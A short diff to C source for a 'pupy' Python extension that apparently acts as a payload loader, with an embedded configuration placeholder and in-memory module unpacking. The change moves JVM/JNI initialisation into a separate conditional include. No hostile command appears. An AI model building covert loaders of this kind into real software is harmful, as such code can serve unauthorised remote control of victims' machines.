@@ -31,21 +31,11 @@ static const char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n";
 
 static PyObject *ExecError;
 
-static void * __JVM = NULL;
-
 #include "lzmaunpack.c"
 
-int JNI_OnLoad(void *vm, void *reserved) {
-    dprint("JVM provided: %p\n", vm);
-
-    __JVM = vm;
-
-	if (PySys_SetObject != NULL) {
-		PySys_SetObject("JVM", PyCapsule_New(__JVM, "JVM", NULL));
-	}
-
-    return 0x00010006;
-}
+#ifdef _PUPY_SO
+#include "jni_on_load.c"
+#endif
 
 static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
@@ -60,7 +50,7 @@ static PyObject *Py_get_modules(PyObject *self, PyObject *args)
             library_c_size);
     }
 
-	Py_INCREF(modules);
+        Py_INCREF(modules);
     return modules;
 }
 
@@ -331,8 +321,7 @@ initpupy(void) {
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
 
-    if (__JVM) {
-		dprint("Assign sys.JVM <- %p\n", __JVM);
-		PySys_SetObject("JVM", PyCapsule_New(__JVM, "JVM", NULL));
-	}
+#ifdef _PUPY_SO
+	setup_jvm_class();
+#endif
 }
